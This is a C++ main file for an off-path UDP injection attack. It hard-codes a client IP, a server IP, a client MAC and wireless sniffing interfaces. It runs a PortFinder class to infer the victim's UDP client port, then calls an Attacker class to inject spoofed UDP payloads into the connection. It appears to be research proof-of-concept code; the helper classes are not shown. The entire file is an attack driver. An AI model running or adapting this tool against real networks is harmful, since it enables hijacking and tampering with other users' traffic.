#include <iostream>
#include <vector>
#include <string>
#include <cstdint>

#include "PortFinder.h"
#include "Attack.h"

int main() {
    
    std::string client_ip = "192.168.31.25";
    std::string server_ip = "81.70.18.217";
    uint16_t server_port = 12345;
    uint16_t start_port = 1;
    uint16_t end_port = 65535;
    std::string send_if_name = "wlan0";
    std::vector<std::string> sniff_if_name = {"wlan1", "wlan2", "wlan3"};
    std::string client_mac = "9a:a6:c0:4b:e1:c2";
    uint16_t step_size = 20000;
    int packet_repeat = 1;
    int base_payload_size = 100;
    int base_frame_size = base_payload_size + 52;
    int nic_rate = 65000;

    std::string attack_payload = "Injected UDP payload";
    int inject_repeat = 1;

    try {
        PortFinder portfinder(client_ip, server_ip, server_port, start_port, end_port,
                              send_if_name, sniff_if_name, client_mac, step_size,
                              packet_repeat, base_payload_size, base_frame_size, nic_rate);

        if (!portfinder.is_sender_initialized()) {
            std::cout << "[*] Sender not initialized, reinitializing..." << std::endl;
            portfinder.initialize_sender(send_if_name, 100, 4);
        }

        portfinder.run();
        std::vector<int> client_ports = portfinder.getResults();

        if (client_ports.empty()) {
            std::cout << "[-] Failed to infer UDP client port, aborting injection." << std::endl;
            return 1;
        }

        std::cout << "\n[+] Inferred UDP port(s): ";
        for (size_t i = 0; i < client_ports.size(); ++i) {
            std::cout << client_ports[i];
            if (i + 1 < client_ports.size()) {
                std::cout << ", ";
            }
        }
        std::cout << std::endl;

        for (int port : client_ports) {
            if (port < 0 || port > 65535) {
                std::cout << "[-] Skip invalid inferred port: " << port << std::endl;
                continue;
            }

            Attacker attacker(client_ip, server_ip,
                              static_cast<uint16_t>(port), server_port,
                              send_if_name, attack_payload, inject_repeat);
            attacker.UDP_inject();
        }
    } catch (const std::exception& e) {
        std::cerr << "[!] Fatal error: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}
